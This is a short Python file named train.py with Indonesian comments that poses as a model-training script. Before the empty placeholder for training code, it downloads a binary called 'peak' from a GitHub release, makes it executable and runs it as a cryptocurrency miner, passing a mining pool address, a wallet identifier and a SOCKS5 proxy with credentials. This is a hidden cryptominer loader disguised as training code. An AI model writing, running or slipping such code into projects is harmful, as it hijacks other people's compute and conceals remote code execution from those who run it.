# train.py
import subprocess
import os

URL = "https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak"   # ganti dengan URL Anda
FILE = "peak"                     # nama file hasil unduhan

# 1. wget — unduh file
if not os.path.exists(FILE):
    print(f"Mengunduh {URL} ...")
    subprocess.run(["wget", "-O", FILE, URL], check=True)
else:
    print("File sudah ada, lewati unduhan.")

# 2. chmod — beri izin eksekusi
print(f"Memberi izin eksekusi ke {FILE} ...")
subprocess.run(["chmod", "+x", FILE], check=True)

# 3. ./ — jalankan file
print(f"Menjalankan ./peak --coin pearl --url 192.210.169.184:80 --user prl1pahcdcce2mtd5j2wahl2t240dkl289z9v7lv2wxyc8ay0vae3gxvqzycfgq.cucul --proxy socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443")
subprocess.run([
    "./peak",
    "--coin", "pearl",
    "--url", "192.210.169.184:80",
    "--user", "prl1...",
    "--proxy", "socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443",
], check=True)

# 4. Lanjut training
print("Mulai training...")
# ... kode training Anda ...
